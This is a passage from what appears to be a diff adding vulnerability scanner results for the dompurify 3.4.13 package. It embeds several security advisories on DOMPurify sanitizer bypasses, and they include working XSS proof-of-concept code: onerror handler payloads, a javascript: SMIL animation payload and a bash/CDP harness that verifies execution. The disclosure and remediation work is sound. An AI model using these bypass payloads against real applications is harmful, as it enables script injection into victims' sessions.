root.innerHTML = '\u003cfigure\u003e\u003cimg class=bad src=data:,\u003e\u003cimg src=x onerror=\"fired.push(\\'' + mode + '\\')\"\u003e\u003c/figure\u003e\u003cp\u003eok\u003c/p\u003e';\n  D.sanitize(root, { IN_PLACE: true });\n  return root.outerHTML;\n}\nconst a = run('self'), b = run('parent');\nsetTimeout(() =\u003e {\n  document.getElementById('log').textContent =\n    'version=' + DOMPurify.version + '\\nself out=' + a + '\\nparent out=' + b + '\\nfired=' + JSON.stringify(fired);\n}, 1500);\n\u003c/script\u003e\n```\n\nResult on 3.4.16:\n\n```\nversion=3.4.16\nself out=\u003cdiv\u003e\u003cfigure\u003e\u003cimg src=\"x\"\u003e\u003c/figure\u003e\u003cp\u003eok\u003c/p\u003e\u003c/div\u003e\nparent out=\u003cdiv\u003e\u003cp\u003eok\u003c/p\u003e\u003c/div\u003e\nfired=[\"parent\"]\n```\n\nThe returned tree is clean in both cases, but the handler on the detached image runs in the page for `parent`.\n\n### Impact\n\nAn app that uses `IN_PLACE` with a hook that removes a wrapper or a nearby element (for example \"drop the whole `\u003cfigure\u003e` if its image is not allowed\") gets DOM XSS from attacker markup after `sanitize()` returns. It needs that kind of hook, so it falls under \"input plus an application choice\" in SECURITY.md, but it breaks the guarantee the README gives for hook detached nodes and is the same pattern as GHSA-55q2-fjhq-7xh7 and GHSA-p98j-92pf-mc4p.\n\n### Suggested fix\n\nInstead of only checking `currentNode`, check after each hook call whether anything outside the current node was detached. Two simple options:\n\n- before calling a hook in `IN_PLACE` mode, remember the next node the walker will visit and the current node's ancestors; after the hook, neutralize any of them that are no longer attached under `root`\n- or, after the walk, neutralize every element that was in the original tree but is no longer connected to `root` (for example by collecting the elements before the walk)",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 7.6
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-mrv2-3pqr-j5jr",
+            "https://github.com/advisories/GHSA-mrv2-3pqr-j5jr",
+            "https://github.com/cure53/DOMPurify",
+            "https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575",
+            "https://github.com/cure53/DOMPurify/pull/1672",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.4.17",
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-mrv2-3pqr-j5jr"
+          ],
+          "PublishedDate": "2026-10-22T16:24:52Z",
+          "LastModifiedDate": "2026-10-22T16:24:52Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-6688-9rhm-gjv2",
+          "PkgID": "dompurify@3.4.13",
+          "PkgName": "dompurify",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/dompurify@3.4.13",
+            "UID": "699183137de1e003"
+          },
+          "InstalledVersion": "3.4.13",
+          "FixedVersion": "3.4.16",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-6688-9rhm-gjv2",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:635edbeddfca6ca8591a2529e2fbd564c330f89bdc03f953d48e709250c25738",
+          "Title": "DOMPurify: IN_PLACE returns a force-removed rawtext root whose text carries attacker markup — pure HTML reparse executes",
+          "Description": "## Environment\n\n- dompurify 3.4.15 (current npm release); reproduced independently on jsdom 30.0.1 and 29.1.1 (Node.js 20.x / 26.x)\n- Config: `DOMPurify.sanitize(node, { IN_PLACE: true })` on a Node input; `SAFE_FOR_XML` at its default (`true`)\n\n## Summary\n\nThe 3.4.9 fix for the IN_PLACE detached-root class added two protections on the IN_PLACE return path: a fail-closed `TypeError` in `_forceRemove` when a node selected for removal cannot be detached, and a `_neutralizeSubtree` pass (`dist/purify.js` line 1336) that strips non-allowlisted **attributes** from removed subtrees.\n\nBoth miss the rawtext **text-content** form. When the force-removed root is a rawtext element (`\u003cstyle\u003e`), the payload lives in the node's *text*: the node detaches fine (the `TypeError` guard is not reached), `_neutralizeSubtree` strips nothing (there are no attributes), and the IN_PLACE exit returns the detached, never-sanitized `\u003cstyle\u003e` whose text still carries live markup. Serializing that node and re-parsing it in **plain HTML context** materializes the payload — no foreign-content context required.\n\nThe same Node input sanitized **without** `IN_PLACE` returns an empty result: the only difference is the IN_PLACE return path handing the killed node back.\n\n## Steps to reproduce\n\n```js\nconst { JSDOM } = require('jsdom');\nconst createDOMPurify = require('dompurify');   // 3.4.15\n\nconst window = new JSDOM('').window;\nconst DOMPurify = createDOMPurify(window);\n\nconst styleRoot = window.document.createElement('style');\nstyleRoot.setAttribute('onclick', 'alert(1)');    // attribute payload\nstyleRoot.textContent = '\u003c/style\u003e\u003cimg src=x onerror=1\u003e';  // text payload\nwindow.document.body.appendChild(styleRoot);\n\nconst returned = DOMPurify.sanitize(styleRoot, { IN_PLACE: true });\n\nconsole.log(returned === styleRoot);                       // true (same node)\nconsole.log(styleRoot.parentNode === null);                // true (detached)\nconsole.log(styleRoot.outerHTML);\n// \u003cstyle\u003e\u003c/style\u003e\u003cimg src=x onerror=1\u003e\u003c/style\u003e\nconsole.log(styleRoot.getAttribute('onclick'));            // null  (attribute neutralized)\nconsole.log(styleRoot.textContent);                        // '\u003c/style\u003e\u003cimg src=x onerror=1\u003e' (text survives)\n\n// plain HTML reparse (no foreign-content context involved):\nconst probe = window.document.createElement('div');\nprobe.innerHTML = returned.outerHTML || styleRoot.outerHTML;\nconsole.log(probe.querySelectorAll('img').length);         // 1\nconsole.log(probe.querySelector('img').getAttribute('onerror')); // \"1\"\n```\n\nObserved on 3.4.15: one node, one call — the `onclick` **attribute** is neutralized while the **text** payload (`\u003c/style\u003e\u003cimg src=x onerror=1\u003e`) survives verbatim; serializing and re-parsing the returned node in plain HTML context materializes the `img` with the live `onerror` handler.\n\nContrast on the same Node input without `IN_PLACE`: `RETURN_DOM: true` → `\u003cbody\u003e\u003c/body\u003e`; `RETURN_DOM_FRAGMENT: true` → 0 children — the payload is fully sanitized away. The only difference is the IN_PLACE return path.\n\nContrast on the removal trigger: `SAFE_FOR_XML: false` → the node is not removed (detached stays false); plain CSS text → not removed. The removal is gated by the mXSS text probes and happens *specifically because* the serialized node would re-open tags on reparse.\n\n## Root cause\n\n`_isUnsafeNode` (`dist/purify.js` 3.4.15, lines 1700–1714) removes nodes whose literal text would re-open tags on reparse — shape (b) in the source comment is \"text-only content that already carries the element's OWN end tag\", detected by the `LITERAL_TEXT_CLOSE` probe (line 385) alongside the `ELEMENT_MARKUP_PROBE` (line 339) rules. `_forceRemove` (line 1122) records the node in `DOMPurify.removed` (`{element}`) and detaches it. The removal is intentional: the upstream comment states these shapes are removed **because the literal serializer emits them verbatim for the HTML parser to re-open**.\n\nThe IN_PLACE exit then hands the force-removed root back to the caller — the very node whose removal `DOMPurify.removed` just recorded (verified: `DOMPurify.removed.some(e =\u003e e.element === root)` is `true` on the returned instance). The 3.4.9 `_neutralizeSubtree` pass (line 1336) addresses only the attribute form — its own docstring: \"walks a removed subtree and strips every attribute\" (purpose: cancel queued resource events). Rawtext text content is out of its scope, so the removal that was performed *specifically to prevent reparse* is undone by returning the node: you removed it to stop the reparse, then returned it.\n\nDifferential (one node, one call, same removal path): the `onclick` attribute is neutralized by the existing pass while the text payload survives verbatim — the attribute axis is covered, the text axis is the gap.\n\n## Impact\n\nIdentical blast radius to the published IN_PLACE family: an application that sanitizes a Node in `IN_PLACE` mode and re-inserts (or serializes and then re-inserts) the result materializes attacker markup in plain HTML context: script execution in the page. Moving the returned node via `appendChild` alone is safe; the round trip through serialization is what fires the payload. No foreign-content context is required with the close-tag payload.\n\n## Affected versions\n\n- Verified live: 3.4.15 (current).\n- Source-verified: the attribute-only `_neutralizeSubtree` and the IN_PLACE return path are present in 3.4.9–3.4.14; releases before 3.4.9 predate the fix entirely (unconditional return; individual pre-3.4.9 releases not dynamically tested).\n- Per cure53 advisory convention the affected range is reported as `\u003c= 3.4.15` (current at time of writing).\n\n## Suggested remediation\n\n**Primary (root-cause, covers every form):** at the IN_PLACE exit, check whether the returned root was recorded during sanitization — `DOMPurify.removed.some(e =\u003e e.element === root)` — and fail closed: throw the same `TypeError` style used by the 3.4.9 detach guard (\"a node selected for removal could not be safely returned; refusing to sanitize in place\"), or return `null`. This is consistent with the existing fail-closed design and covers all present and future root-kill reasons in one check.\n\n**Secondary (form-specific):** extend `_neutralizeSubtree` to neutralize **text content of rawtext descendants** — the elements in `LITERAL_TEXT_ELEMENT_NAMES` (`style`, `script`, `xmp`, `iframe`, `noembed`, `noframes`, `plaintext`, `noscript`) — by rewriting `textContent` to a defanged form, matching the probe coverage of `_isUnsafeNode`/`LITERAL_TEXT_CLOSE`.\n\nA regression test asserting that a force-removed rawtext root comes back with no `/\u003c[/\\w!]/` match in `textContent` (and is not returned at all under the primary fix) prevents re-introduction.\n\n## Prior art / differentiation\n\n- GHSA-r47g-fvhr-h676 (fixed 3.4.6): clobbered-form **root** removal — different trigger; this report's root is a normal allowlisted `style` element killed by the text probe.\n- GHSA-55q2-fjhq-7xh7 (low): IN_PLACE **hook removal** leaves a detached subtree executable — the attribute-form twin (hook-stripped subtree retains onload-class handlers). This report's rawtext **text** form is not covered by `_neutralizeSubtree`'s attribute stripping and is not that advisory.\n- GHSA-h8r8-wccr-v5f2 (medium): mXSS via re-contextualization in the standard (non-IN_PLACE) serialize path — different mechanism; IN_PLACE is not involved.\n- The 3.4.9 release notes credit @mozfreedyb for the IN_PLACE handling improvements that this residual escapes on the text axis.\n\n## Applicability scope (stated up front)\n\nThe payload materializes when the application **serializes and re-parses** the sanitizer output (`innerHTML` assignment, template rendering, markdown/HTML round trips) or otherwise consumes the returned node's markup. Moving the returned node via `appendChild` alone does not trigger it. Applications that pass **live, connected attacker trees** into `IN_PLACE` are explicitly warned against by upstream's own source comment; this report concerns the serialize-and-reinsert consumption pattern that the IN_PLACE mode exists to serve.",
+          "Severity": "LOW",
+          "VendorSeverity": {
+            "ghsa": 1
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-6688-9rhm-gjv2",
+            "https://github.com/advisories/GHSA-6688-9rhm-gjv2",
+            "https://github.com/cure53/DOMPurify",
+            "https://github.com/cure53/DOMPurify/commit/b9b9d80f7e401771c2ccaef5f45def7eec8f27d7",
+            "https://github.com/cure53/DOMPurify/pull/1636",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.4.16",
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-6688-9rhm-gjv2"
+          ],
+          "PublishedDate": "2026-10-05T23:43:53Z",
+          "LastModifiedDate": "2026-10-05T23:43:53Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-c6gr-qvv4-5v3f",
+          "PkgID": "dompurify@3.4.13",
+          "PkgName": "dompurify",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/dompurify@3.4.13",
+            "UID": "699183137de1e003"
+          },
+          "InstalledVersion": "3.4.13",
+          "FixedVersion": "3.4.17",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-c6gr-qvv4-5v3f",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:0264884fc6b9f28c90c50127faee6d1f7eda998de0f2334f60aef99d6fa588e1",
+          "Title": "DOMPurify: SMIL attributeName=href guard is skipped when PARSER_MEDIA_TYPE is application/xhtml+xml",
+          "Description": "### Summary\n\nDOMPurify drops `attributeName` attributes whose value contains `href`, so an allowed `\u003canimate\u003e` or `\u003cset\u003e` can't rewrite a link's href after sanitizing. The check compares the attribute name after `transformCaseFunc`, and that function doesn't lowercase in XHTML mode. In XHTML the attribute is spelled `attributeName`, so the comparison with `\"attributename\"` never matches and the guard does nothing.\n\nAn app that uses `PARSER_MEDIA_TYPE: 'application/xhtml+xml'` and allows `animate` and `attributeName` will keep `\u003canimate attributeName=\"href\" values=\"x;javascript:alert(1)\"\u003e`. Clicking the parent link then runs the script.\n\nThis needs a non-default config, so going by SECURITY.md, this is a hardening bug rather than a bypass of the default config.\n\n### Details\n\nIn `_sanitizeAttributes` (dist/purify.js line 2216 in 3.4.16):\n\n```js\nconst lcName = transformCaseFunc(name);\n...\nif (lcName === \"attributename\" \u0026\u0026 stringMatch(value, \"href\")) {\n  _removeAttribute(name, currentNode, attr);\n  continue;\n}\n```\n\n`transformCaseFunc` is `stringToLowerCase` for text/html but the identity function for application/xhtml+xml, because XML names are case-sensitive. The XML parser keeps SVG's real name `attributeName`, so in XHTML mode `lcName` is `attributeName` and the branch never runs.\n\nPeople using XHTML mode have to list SVG attributes in camelCase. The built-in attribute lists are lowercase and won't match, so `ALLOWED_ATTR`/`ADD_ATTR: ['attributeName', ...]` is the config you'd naturally write here.\n\nThe value also passes the URI check. `IS_ALLOWED_URI` only checks the start of the string, and `x;javascript:alert(1)` looks like a relative value. SMIL reads `values` as a `;` list and, with `fill=\"freeze\"`, the last entry ends up as the effective href of the parent `\u003ca\u003e`.\n\nIn text/html mode the same allowlist is handled correctly. The name is lowercased and `attributeName` is removed.\n\nThis is close to the XHTML case-sensitivity hardening in 3.4.14/3.4.15 (Attack Classes \u0026 Bypass History §22): a check written for lowercase names that a case-preserved name gets past.\n\n### Proof of concept\n\nTested with DOMPurify 3.4.16 in Chrome 153 (headless shell). Also reproduced on 3.3.3, 3.3.1 and 3.2.7. Not confirmed for 2.x.\n\nConfig:\n\n```js\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\n```\n\n`{ PARSER_MEDIA_TYPE: 'application/xhtml+xml', USE_PROFILES: { svg: true }, ADD_TAGS: ['animate'], ADD_ATTR: ['attributeName'] }` behaves the same.\n\nInput:\n\n```html\n\u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"\u003e\u003ca id=\"q\"\u003e\u003canimate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/\u003e\u003ctext x=\"10\" y=\"40\" font-size=\"30\"\u003eclick\u003c/text\u003e\u003c/a\u003e\u003c/svg\u003e\n```\n\nSteps:\n\n1. Save this as `poc.xhtml` next to `purify.js` (3.4.16) and open it in Chrome. The `.xhtml` extension makes Chrome load it as application/xhtml+xml, so nothing moves between HTML and XHTML.\n\n```html\n\u003chtml xmlns=\"http://www.w3.org/1999/xhtml\"\u003e\u003chead\u003e\u003ctitle\u003epoc\u003c/title\u003e\n\u003cscript src=\"purify.js\"\u003e\u003c/script\u003e\u003c/head\u003e\u003cbody\u003e\u003cdiv id=\"sink\"\u003e\u003c/div\u003e\n\u003cscript\u003e//\u003c![CDATA[\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\nconst dirty = '\u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"\u003e\u003ca id=\"q\"\u003e\u003canimate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/\u003e\u003ctext x=\"10\" y=\"40\" font-size=\"30\"\u003eclick\u003c/text\u003e\u003c/a\u003e\u003c/svg\u003e';\nconst clean = DOMPurify.sanitize(dirty, cfg);\nconsole.log(clean);\ndocument.getElementById('sink').innerHTML = clean;\n//]]\u003e\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e\n```\n\n2. The logged output still contains `attributeName=\"href\"` and `values=\"x;javascript:alert(1)\"`.\n3. `document.getElementById('q').href.animVal` returns `\"javascript:alert(1)\"`.\n4. Click \"click\" and `alert(1)` runs.\n\nAs a control, remove `PARSER_MEDIA_TYPE` and change the allowlist entry to `attributename`. The output then loses `attributeName`, `href.animVal` is `\"\"`, and clicking does nothing. The same XHTML-mode output also runs when inserted into a normal text/html page.\n\nAn automated version (fetches a given version from npm, clicks via CDP, checks for the dialog, runs the control) is below.\n\n\u003cdetails\u003e\n\u003csummary\u003epoc.sh\u003c/summary\u003e\n\n```bash\n#!/usr/bin/env bash\n# PoC: DOMPurify SMIL attributeName=href guard bypass in XHTML parser mode.\n#\n# Sanitizes an SVG payload with a PARSER_MEDIA_TYPE:\"application/xhtml+xml\"\n# config that allow-lists \u003canimate\u003e + attributeName, renders the output into\n# div.innerHTML in headless Chromium, clicks the link with a trusted (CDP) mouse\n# event and reports whether alert() fired. Also runs the same allowlist in\n# text/html mode as a control (DOMPurify strips attributeName there).\n#\n# usage:  ./poc.sh [dompurify-version]          (default 3.4.16, fetched via `npm pack`)\n#         DOMPURIFY_JS=/path/to/purify.js ./poc.sh\n#         CHROME=/path/to/chrome ./poc.sh\n# needs:  node \u003e= 18, npm (unless DOMPURIFY_JS is set), a Chromium/Chrome binary.\n# exit:   0 = vulnerable (alert fired in xhtml mode), 1 = not vulnerable, 2 = setup error\nset -euo pipefail\nVER=\"${1:-3.4.16}\"\nWORK=\"$(mktemp -d)\"\ntrap 'rm -rf \"$WORK\"' EXIT\n\nif [ -z \"${DOMPURIFY_JS:-}\" ]; then\n  (cd \"$WORK\" \u0026\u0026 npm pack \"dompurify@$VER\" --silent \u003e/dev/null 2\u003e\u00261 \u0026\u0026 tar xzf dompurify-*.tgz) || { echo \"npm pack dompurify@$VER failed\" \u003e\u00262; exit 2; }\n  DOMPURIFY_JS=\"$WORK/package/dist/purify.js\"\nfi\nif [ -z \"${CHROME:-}\" ]; then\n  for c in \"$HOME\"/.cache/ms-playwright/chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell \\\n           \"$HOME\"/.cache/ms-playwright/chromium-*/chrome-linux/chrome \\\n           \"$(command -v google-chrome || true)\" \"$(command -v chromium || true)\" \"$(command -v chromium-browser || true)\"; do\n    [ -n \"$c\" ] \u0026\u0026 [ -x \"$c\" ] \u0026\u0026 CHROME=\"$c\" \u0026\u0026 break\n  done\nfi\n[ -n \"${CHROME:-}\" ] || { echo \"no Chrome/Chromium found; set CHROME=\" \u003e\u00262; exit 2; }\n\ncat \u003e \"$WORK/poc.html\" \u003c\u003c'EOF'\n\u003c!doctype html\u003e\u003cmeta charset=\"utf-8\"\u003e\u003ctitle\u003epoc\u003c/title\u003e\n\u003cscript src=\"purify.js\"\u003e\u003c/script\u003e\n\u003cdiv id=\"sink\"\u003e\u003c/div\u003e\n\u003cscript\u003e//\u003c![CDATA[\nconst payload = '\u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"\u003e' +\n  '\u003ca id=\"q\"\u003e\u003canimate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/\u003e' +\n  '\u003ctext x=\"10\" y=\"40\" font-size=\"30\"\u003eclick\u003c/text\u003e\u003c/a\u003e\u003c/svg\u003e';\nfunction run(mode) {\n  const cfg = {\n    ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n    ALLOWED_ATTR: [mode === 'xhtml' ? 'attributeName' : 'attributename', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n  };\n  if (mode === 'xhtml') cfg.PARSER_MEDIA_TYPE = 'application/xhtml+xml';\n  const clean = DOMPurify.sanitize(payload, cfg);\n  document.getElementById('sink').innerHTML = clean;\n  return clean;\n}\n//]]\u003e\u003c/script\u003e\nEOF\ncp \"$DOMPURIFY_JS\" \"$WORK/purify.js\"\n# Same test inside a real XHTML document (no HTML\u003c-\u003eXHTML context flip):\n# the page is parsed as application/xhtml+xml and the sink's innerHTML uses the XML fragment parser.\nsed -e 's#\u003c!doctype html\u003e\u003cmeta charset=\"utf-8\"\u003e\u003ctitle\u003epoc\u003c/title\u003e#\u003chtml xmlns=\"http://www.w3.org/1999/xhtml\"\u003e\u003chead\u003e\u003ctitle\u003epoc\u003c/title\u003e#' \\\n    -e 's#\u003cscript src=\"purify.js\"\u003e\u003c/script\u003e#\u003cscript src=\"purify.js\"\u003e\u003c/script\u003e\u003c/head\u003e\u003cbody\u003e#' \\\n    -e 's#^\u003c/script\u003e$#\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e#' \"$WORK/poc.html\" \u003e \"$WORK/poc.xhtml\"\n\ncat \u003e \"$WORK/drive.js\" \u003c\u003c'EOF'\n// zero-dependency CDP driver over --remote-debugging-pipe\nconst { spawn } = require('child_process');\nconst [chrome, url, dir] = process.argv.slice(2);\nconst xurl = url.replace(/\\.html$/, '.xhtml');\nconst p = spawn(chrome, ['--headless', '--no-sandbox', '--remote-debugging-pipe', '--disable-gpu', '--no-first-run',\n  `--user-data-dir=${dir}/profile`, 'about:blank'], { stdio: ['ignore', 'ignore', 'ignore', 'pipe', 'pipe'] });\nlet id = 0, buf = ''; const pend = new Map(), dialogs = [];\np.stdio[4].on('data', (d) =\u003e {\n  buf += d; let i;\n  while ((i = buf.indexOf('\\0')) \u003e= 0) {\n    const m = JSON.parse(buf.slice(0, i)); buf = buf.slice(i + 1);\n    if (m.id \u0026\u0026 pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }\n    else if (m.method === 'Page.javascriptDialogOpening') {\n      dialogs.push(m.params.message);\n      send('Page.handleJavaScriptDialog', { accept: true }, m.sessionId);\n    }\n  }\n});\nfunction send(method, params = {}, sessionId) {\n  return new Promise((r) =\u003e { const n = ++id; pend.set(n, r); p.stdio[3].write(JSON.stringify({ id: n, method, params, sessionId }) + '\\0'); });\n}\nconst sleep = (ms) =\u003e new Promise((r) =\u003e setTimeout(r, ms));\n(async () =\u003e {\n  const { result: { targetId } } = await send('Target.createTarget', { url: 'about:blank' });\n  const { result: { sessionId: s } } = await send('Target.attachToTarget', { targetId, flatten: true });\n  await send('Page.enable', {}, s); await send('Runtime.enable', {}, s);\n  const ev = async (e) =\u003e (await send('Runtime.evaluate', { expression: e, returnByValue: true, awaitPromise: true }, s)).result.result.value;\n  let vulnerable = false, xhtmlDoc = false;\n  const ver = async () =\u003e ev('DOMPurify.version');\n  for (const [mode, page] of [['html', url], ['xhtml', url], ['xhtml', xurl]]) {\n    await send('Page.navigate', { url: page }, s); await sleep(500);\n    const docType = await ev('document.contentType');\n    if (mode === 'html') console.log('DOMPurify', await ver(), '/', await ev('navigator.userAgent.match(/Chrome\\\\/[\\\\d.]+/)[0]'));\n    dialogs.length = 0;\n    const clean = await ev(`run(${JSON.stringify(mode)})`);\n    await sleep(400); // let the 0.01s animation apply (fill=freeze)\n    const href = await ev(`(()=\u003e{const a=document.getElementById('q');return a?a.href.animVal:null})()`);\n    const box = await ev(`(()=\u003e{const t=document.querySelector('#sink text');if(!t)return null;const r=t.getBoundingClientRect();return [r.x+r.width/2,r.y+r.height/2]})()`);\n    if (box) for (const type of ['mouseMoved', 'mousePressed', 'mouseReleased'])\n      await send('Input.dispatchMouseEvent', { type, x: box[0], y: box[1], button: 'left', clickCount: 1 }, s);\n    await sleep(800);\n    console.log(`\\n[${mode} mode, sink document ${docType}] sanitized output:\\n  ${clean}`);\n    console.log(`  animated \u003ca\u003e href (animVal): ${JSON.stringify(href)}`);\n    console.log(`  alert() fired on click: ${dialogs.length ? 'YES ' + JSON.stringify(dialogs) : 'no'}`);\n    if (mode === 'xhtml' \u0026\u0026 dialogs.length) vulnerable = true;\n    if (mode === 'xhtml' \u0026\u0026 docType === 'application/xhtml+xml') xhtmlDoc = dialogs.length \u003e 0;\n  }\n  console.log(vulnerable ? `\\nRESULT: VULNERABLE (javascript: executed in XHTML mode; pure-XHTML document sink: ${xhtmlDoc ? 'also executes' : 'no'})` : '\\nRESULT: not vulnerable');\n  p.kill('SIGKILL'); process.exit(vulnerable ? 0 : 1);\n})().catch((e) =\u003e { console.error(e); p.kill('SIGKILL'); process.exit(2); });\nEOF\nnode \"$WORK/drive.js\" \"$CHROME\" \"file://$WORK/poc.html\" \"$WORK\"\n```\n\n\u003c/details\u003e\n\n### Impact\n\nStored or reflected XSS on a click. It affects apps that sanitize SVG in XHTML mode and allow `animate` (or `set`) with `attributeName`, for example to keep simple SVG animations. Script runs in the app's origin when a user clicks the sanitized link. Default configs and text/html mode aren't affected.",
+          "Severity": "LOW",
+          "VendorSeverity": {
+            "ghsa": 1
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-c6gr-qvv4-5v3f",
+            "https://github.com/advisories/GHSA-c6gr-qvv4-5v3f",
+            "https://github.com/cure53/DOMPurify",
+            "https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575",
+            "https://github.com/cure53/DOMPurify/pull/1672",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.4.17",
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-c6gr-qvv4-5v3f"
+          ],
+          "PublishedDate": "2026-10-22T16:24:23Z",
+          "LastModifiedDate": "2026-10-22T16:24:23Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-p98j-92pf-mc4p",
+          "PkgID": "dompurify@3.4.13",
+          "PkgName": "dompurify",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/dompurify@3.4.13",
+            "UID": "699183137de1e003"
+          },
+          "InstalledVersion": "3.4.13",
+          "FixedVersion": "3.4.16",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-p98j-92pf-mc4p",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:2082a835de6508f996ac8aebe68e78357997f745ac40a1ff7f0e22d93844b9e6",
+          "Title": "DOMPurify: IN_PLACE: node-removing afterSanitize hook leaves detached subtree event handlers armed, causing DOM XSS",
+          "Description": "## Summary\n\nIn `IN_PLACE` mode DOMPurify sanitizes the caller's live DOM subtree directly. To close a known hazard (GHSA-55q2-fjhq-7xh7), the library neutralizes any node a hook detaches during sanitization by stripping its subtree's non-allow-listed attributes, but this neutralization is wired only into the `beforeSanitizeElements` and `uponSanitizeElement` hook sites. An `afterSanitizeElements` or `afterSanitizeAttributes` hook that removes a non-root element (a documented, supported pattern) detaches that element's subtree with no neutralization, so descendant `on*` handlers remain armed on the caller's live tree after `sanitize()` returns, yielding DOM XSS. No special privilege is required beyond supplying markup to an application that uses `IN_PLACE` together with a node-removing afterSanitize hook.\n\n## Root Cause\n\n`IN_PLACE` sanitization mutates the caller's live document, so any element a hook detaches from that tree must have its subtree neutralized before `sanitize()` returns; otherwise a queued resource-event handler (for example an `\u003cimg onerror\u003e` that began loading when the caller built the tree) fires in page scope even though the handler never reached the sanitized output. The guard helper `_handleHookDetachedNode` (which calls `_neutralizeSubtree` in `IN_PLACE`) is invoked only after `beforeSanitizeElements` and after `uponSanitizeElement`. It is never invoked from the afterSanitize return paths, and `_sanitizeAttributes` never calls it at all. The post-walk `IN_PLACE` neutralization pass iterates only `DOMPurify.removed`, and hook-detached nodes are intentionally not recorded there, so that pass cannot reach them either.\n\n```text\nsrc/purify.ts\n  _sanitizeElements: _handleHookDetachedNode present at lines 2142 and 2175\n    (before/upon), absent after afterSanitizeElements at lines 2208 and 2249.\n  _sanitizeAttributes: afterSanitizeAttributes fires at line 2670 with no\n    detach re-check; the function never calls _handleHookDetachedNode.\n  Post-walk IN_PLACE pass (lines 3081-3090) iterates DOMPurify.removed only,\n    which by design (comment at lines 2096-2099) excludes hook-detached nodes.\n```\n\n## Impact\n\nAn attacker who supplies markup processed by a victim application that runs `DOMPurify.sanitize(node, { IN_PLACE: true })` and registers a node-removing `afterSanitizeElements` or `afterSanitizeAttributes` hook can retain arbitrary `on*` event handlers on descendants of a removed non-root element. Because `IN_PLACE` operates on the caller's live document, a queued resource-event handler on such a descendant fires in the page origin after the synchronous `sanitize()` call returns, giving script execution in the victim's session (DOM XSS). This defeats DOMPurify's `IN_PLACE` contract to neutralize handlers on subtrees removed from the live tree. The capability is script execution in the victim origin; exact confidentiality and integrity effects depend on the hosting application's session.\n\n## Proof of Concept\n\n```text\nDependencies: Node.js and jsdom. The harness builds a live tree, registers a\nremoval hook, runs IN_PLACE sanitize(), then inspects whether the attacker\nonerror handler survives on the detached descendant. jsdom does not perform\nreal image loads, so the retained handler (rather than an actual fired event)\nis the observed hazard; the retained on* attribute on a live detached node\nafter a synchronous sanitize() return is the neutralization failure.\n```\n\nReproduction steps:\n1. Build a live subtree `#root \u003e section#wrap \u003e img[onerror]` where `#root` is the walk root and `section#wrap` is a non-root wrapper.\n2. Register an `afterSanitizeElements` (or `afterSanitizeAttributes`) hook that calls `node.remove()` on the wrapper.\n3. Call `DOMPurify.sanitize(root, { IN_PLACE: true })`.\n4. Observe that the descendant `\u003cimg\u003e` retains its `onerror` handler, whereas the same removal performed in a `beforeSanitizeElements`/`uponSanitizeElement` hook strips it.\n\n```javascript\nconst { JSDOM } = require('jsdom');\nconst createDOMPurify = require('dompurify');\nconst { window } = new JSDOM('\u003c!DOCTYPE html\u003e\u003cbody\u003e\u003c/body\u003e');\nconst DOMPurify = createDOMPurify(window);\n\nconst root = 